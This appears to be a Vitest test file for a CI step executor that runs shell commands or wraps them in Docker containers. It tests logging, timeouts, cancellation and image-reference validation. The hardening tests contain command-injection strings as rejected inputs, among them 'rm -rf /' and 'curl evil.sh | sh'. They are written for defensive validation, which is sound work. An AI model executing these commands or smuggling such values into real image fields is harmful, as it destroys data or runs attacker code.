import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { Readable } from "node:stream";
import { executeStep, buildDockerCommand, isValidImageRef } from "../step-executor";
import type { LogStreamer } from "../../logging/log-streamer";

function makeSubprocess(
  exitCode: number,
  timedOut: boolean,
  stdoutChunks: string[] = [],
  stderrChunks: string[] = [],
) {
  const stdout = new Readable({
    read() {
      for (const c of stdoutChunks) this.push(c);
      this.push(null);
    },
  });
  const stderr = new Readable({
    read() {
      for (const c of stderrChunks) this.push(c);
      this.push(null);
    },
  });
  const promise = Promise.resolve({ exitCode, timedOut, stdout, stderr });
  return Object.assign(promise, { stdout, stderr });
}

// Mock execa with a default implementation
vi.mock("execa", () => ({
  execa: vi.fn(),
}));

function createMockLogStreamer(): LogStreamer {
  return {
    push: vi.fn(),
    flush: vi.fn().mockResolvedValue(undefined),
    shutdown: vi.fn().mockResolvedValue(undefined),
  } as unknown as LogStreamer;
}

describe("executeStep", () => {
  let mockExeca: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    vi.clearAllMocks();
    const mod = await import("execa");
    mockExeca = mod.execa as unknown as ReturnType<typeof vi.fn>;
    // Reset to default: successful command that outputs "hello world"
    mockExeca.mockImplementation(() =>
      makeSubprocess(0, false, ["hello world\n"], []),
    );
  });

  it("executes a simple command and returns exit code 0", async () => {
    const logStreamer = createMockLogStreamer();

    const result = await executeStep({
      command: "echo hello",
      cwd: "/tmp",
      logStreamer,
    });

    expect(result.exitCode).toBe(0);
    expect(result.timedOut).toBe(false);
  });

  it("streams stdout lines to logStreamer with level info", async () => {
    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "echo hello",
      cwd: "/tmp",
      logStreamer,
      taskRunId: "task-1",
      stepRunId: "step-1",
    });

    expect(logStreamer.push).toHaveBeenCalledWith(
      expect.objectContaining({
        level: "info",
        message: "hello world",
        task_run_id: "task-1",
        step_run_id: "step-1",
      }),
    );
  });

  it("passes timeout to execa", async () => {
    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "sleep 100",
      cwd: "/tmp",
      timeoutSeconds: 30,
      logStreamer,
    });

    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      ["-c", "sleep 100"],
      expect.objectContaining({ timeout: 30_000 }),
    );
  });

  it("wraps command in docker run when image is specified", async () => {
    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "npm test",
      cwd: "/tmp/workspace",
      image: "node:20",
      logStreamer,
    });

    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      ["-c", expect.stringContaining("docker run --rm")],
      expect.anything(),
    );
    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      ["-c", expect.stringContaining("node:20")],
      expect.anything(),
    );
  });

  it("handles non-zero exit code", async () => {
    mockExeca.mockImplementation(() =>
      makeSubprocess(1, false, [], ["error msg\n"]),
    );

    const logStreamer = createMockLogStreamer();

    const result = await executeStep({
      command: "false",
      cwd: "/tmp",
      logStreamer,
    });

    expect(result.exitCode).toBe(1);
    expect(result.timedOut).toBe(false);
  });

  it("streams stderr to logStreamer with level warn", async () => {
    mockExeca.mockImplementation(() =>
      makeSubprocess(1, false, [], ["warning line\n"]),
    );

    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "bad-cmd",
      cwd: "/tmp",
      logStreamer,
      taskRunId: "t1",
    });

    expect(logStreamer.push).toHaveBeenCalledWith(
      expect.objectContaining({
        level: "warn",
        message: "warning line",
        task_run_id: "t1",
      }),
    );
  });

  it("reports timedOut when execa times out", async () => {
    mockExeca.mockImplementation(() =>
      makeSubprocess(undefined as unknown as number, true),
    );

    const logStreamer = createMockLogStreamer();

    const result = await executeStep({
      command: "sleep 999",
      cwd: "/tmp",
      timeoutSeconds: 1,
      logStreamer,
    });

    expect(result.timedOut).toBe(true);
    expect(result.exitCode).toBe(1); // Falls back to 1 when undefined
  });

  it("merges env variables with process.env", async () => {
    const logStreamer = createMockLogStreamer();

    await executeStep({
      command: "echo $MY_VAR",
      cwd: "/tmp",
      env: { MY_VAR: "test-value" },
      logStreamer,
    });

    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      expect.anything(),
      expect.objectContaining({
        env: expect.objectContaining({ MY_VAR: "test-value" }),
      }),
    );
  });
});

describe("cancellation", () => {
  let mockExeca: ReturnType<typeof vi.fn>;

  /** A subprocess that stays running until `finish` is called. */
  function pendingSubprocess(pid?: number) {
    let finish!: (result: Record<string, unknown>) => void;
    const promise = new Promise((resolve) => {
      finish = resolve;
    });
    const subprocess = Object.assign(promise, {
      pid,
      stdout: Readable.from([]),
      stderr: Readable.from([]),
    });
    return { subprocess, finish };
  }

  beforeEach(async () => {
    vi.clearAllMocks();
    vi.restoreAllMocks();
    const mod = await import("execa");
    mockExeca = mod.execa as unknown as ReturnType<typeof vi.fn>;
    mockExeca.mockImplementation(() => makeSubprocess(0, false));
  });

  it("passes the abort signal to execa as cancelSignal", async () => {
    const controller = new AbortController();

    const result = await executeStep({
      command: "echo hi",
      cwd: "/tmp",
      logStreamer: createMockLogStreamer(),
      signal: controller.signal,
    });

    expect(result.cancelled).toBe(false);
    expect(mockExeca).toHaveBeenCalledWith(
      "sh",
      ["-c", "echo hi"],
      expect.objectContaining({ cancelSignal: controller.signal }),
    );
  });

  it("does not spawn anything when already cancelled", async () => {
    const controller = new AbortController();
    controller.abort();

    const result = await executeStep({
      command: "echo hi",
      cwd: "/tmp",
      logStreamer: createMockLogStreamer(),
      signal: controller.signal,
    });

    expect(result).toEqual({ exitCode: 1, timedOut: false, cancelled: true });
    expect(mockExeca).not.toHaveBeenCalled();
  });

  it("reports cancelled and kills the step's process group on abort", async () => {
    const killSpy = vi.spyOn(process, "kill").mockImplementation(() => true);
    const { subprocess, finish } = pendingSubprocess(4242);
    mockExeca.mockImplementationOnce(() => subprocess);
    const controller = new AbortController();

    const resultPromise = executeStep({
      command: "sleep 600",
      cwd: "/tmp",
      logStreamer: createMockLogStreamer(),
      signal: controller.signal,
    });
    controller.abort();
    finish({ exitCode: undefined, timedOut: false, isCanceled: true });
    const result = await resultPromise;

    expect(result.cancelled).toBe(true);
    if (process.platform !== "win32") {
      expect(killSpy).toHaveBeenCalledWith(-4242, "SIGTERM");
    }
  });

  it("force-removes the step container on abort", async () => {
    vi.spyOn(process, "kill").mockImplementation(() => true);
    const { subprocess, finish } = pendingSubprocess(4243);
    mockExeca
      .mockImplementationOnce(() => subprocess)
      .mockImplementationOnce(() => Promise.resolve({ exitCode: 0, stderr: "" }));
    const controller = new AbortController();

    const resultPromise = executeStep({
      command: "npm test",
      cwd: "/tmp/ws",
      image: "node:20",
      logStreamer: createMockLogStreamer(),
      signal: controller.signal,
    });
    controller.abort();

    await vi.waitFor(() =>
      expect(mockExeca).toHaveBeenCalledWith(
        "docker",
        ["rm", "-f", expect.stringMatching(/^deployx-step-[0-9a-f-]{12}$/)],
        expect.objectContaining({ reject: false }),
      ),
    );
    const containerName = mockExeca.mock.calls[1][1][2];
    expect(mockExeca.mock.calls[0][1][1]).toContain(`--name '${containerName}'`);

    finish({ exitCode: 137, timedOut: false, isCanceled: true });
    expect((await resultPromise).cancelled).toBe(true);
  });

  describe("timeout_seconds", () => {
    afterEach(() => {
      vi.useRealTimers();
    });

    it("kills the process group and removes the step container when the timeout elapses", async () => {
      vi.useFakeTimers();
      const killSpy = vi.spyOn(process, "kill").mockImplementation(() => true);
      const { subprocess, finish } = pendingSubprocess(5151);
      mockExeca
        .mockImplementationOnce(() => subprocess)
        .mockImplementationOnce(() => Promise.resolve({ exitCode: 0, stderr: "" }));

      const resultPromise = executeStep({
        command: "sleep 600",
        cwd: "/tmp/ws",
        image: "node:20",
        timeoutSeconds: 2,
        logStreamer: createMockLogStreamer(),
      });

      await vi.advanceTimersByTimeAsync(1999);
      expect(killSpy).not.toHaveBeenCalled();
      await vi.advanceTimersByTimeAsync(1);

      if (process.platform !== "win32") {
        expect(killSpy).toHaveBeenCalledWith(-5151, "SIGTERM");
      }
      expect(mockExeca).toHaveBeenCalledWith(
        "docker",
        ["rm", "-f", expect.stringMatching(/^deployx-step-/)],
        expect.anything(),
      );

      // execa itself may not flag the timeout when the group kill wins the race
      finish({ exitCode: 143, timedOut: false, isCanceled: false });
      const result = await resultPromise;
      expect(result).toEqual({ exitCode: 143, timedOut: true, cancelled: false });
    });

    it("does not kill anything when the step finishes before the timeout", async () => {
      vi.useFakeTimers();
      const killSpy = vi.spyOn(process, "kill").mockImplementation(() => true);
      mockExeca.mockImplementation(() => makeSubprocess(0, false));

      const result = await executeStep({
        command: "true",
        cwd: "/tmp",
        timeoutSeconds: 1,
        logStreamer: createMockLogStreamer(),
      });
      await vi.advanceTimersByTimeAsync(5000);

      expect(result.timedOut).toBe(false);
      expect(killSpy).not.toHaveBeenCalled();
    });
  });

  it("does not report cancelled when a step finished normally", async () => {
    const controller = new AbortController();
    mockExeca.mockImplementation(() => makeSubprocess(0, false));

    const result = await executeStep({
      command: "true",
      cwd: "/tmp",
      logStreamer: createMockLogStreamer(),
      signal: controller.signal,
    });

    expect(result).toEqual({ exitCode: 0, timedOut: false, cancelled: false });
  });
});

describe("docker step hardening", () => {
  let mockExeca: ReturnType<typeof vi.fn>;

  beforeEach(async () => {
    vi.clearAllMocks();
    vi.restoreAllMocks();
    const mod = await import("execa");
    mockExeca = mod.execa as unknown as ReturnType<typeof vi.fn>;
    mockExeca.mockImplementation(() => makeSubprocess(0, false));
  });

  it("runs the step container as the invoking user when uid/gid are available", async () => {
    const posixProcess = process as unknown as { getuid: () => number; getgid: () => number };
    vi.spyOn(posixProcess, "getuid").mockReturnValue(1234);
    vi.spyOn(posixProcess, "getgid").mockReturnValue(5678);

    await executeStep({
      command: "npm test",
      cwd: "/tmp/workspace",
      image: "node:20",
      logStreamer: createMockLogStreamer(),
    });

    const [, args] = mockExeca.mock.calls[0];
    expect(args[1]).toContain("--user 1234:5678");
  });

  it("omits --user when no host user is available (e.g. Windows)", () => {
    const cmd = buildDockerCommand({
      image: "node:20",
      cwd: "/tmp/ws",
      command: "echo hi",
      containerName: "deployx-step-abc",
      user: null,
    });

    expect(cmd).not.toContain("--user");
  });

  it("single-quotes the image, workspace path and command", () => {
    const cmd = buildDockerCommand({
      image: "ghcr.io/org/app:1.2.3",
      cwd: "/tmp/my ws",
      command: "echo 'hi'",
      containerName: "deployx-step-abc",
      user: "1000:1000",
    });

    expect(cmd).toContain("'ghcr.io/org/app:1.2.3' sh -c");
    expect(cmd).toContain("-v '/tmp/my ws:/workspace'");
    expect(cmd).toContain("--name 'deployx-step-abc'");
    expect(cmd.endsWith(`sh -c 'echo '\\''hi'\\'''`)).toBe(true);
  });

  it.each([
    "node:20; rm -rf /",
    "node:20 && echo pwned",
    "node $(whoami)",
    "node:20`id`",
    "-v /:/host alpine",
    "node:20\nalpine",
    "",
  ])("rejects unsafe image reference %j", (image) => {
    expect(isValidImageRef(image)).toBe(false);
  });

  it.each([
    "node:20",
    "alpine",
    "ghcr.io/org/app:abc1234",
    "localhost:5000/team/app:v1.2_3-rc",
    "node@sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
  ])("accepts image reference %j", (image) => {
    expect(isValidImageRef(image)).toBe(true);
  });

  it("fails the step without spawning anything when the image is unsafe", async () => {
    const logStreamer = createMockLogStreamer();

    const result = await executeStep({
      command: "npm test",
      cwd: "/tmp/workspace",
      image: "node:20; curl evil.sh | sh",
      logStreamer,
      stepRunId: "s1",
    });

    expect(result.exitCode).toBe(1);
    expect(mockExeca).not.toHaveBeenCalled();
    expect(logStreamer.push).toHaveBeenCalledWith(
      expect.objectContaining({
        level: "error",
        message: expect.stringContaining("Invalid Docker image reference"),
        step_run_id: "s1",
      }),
    );
  });
});
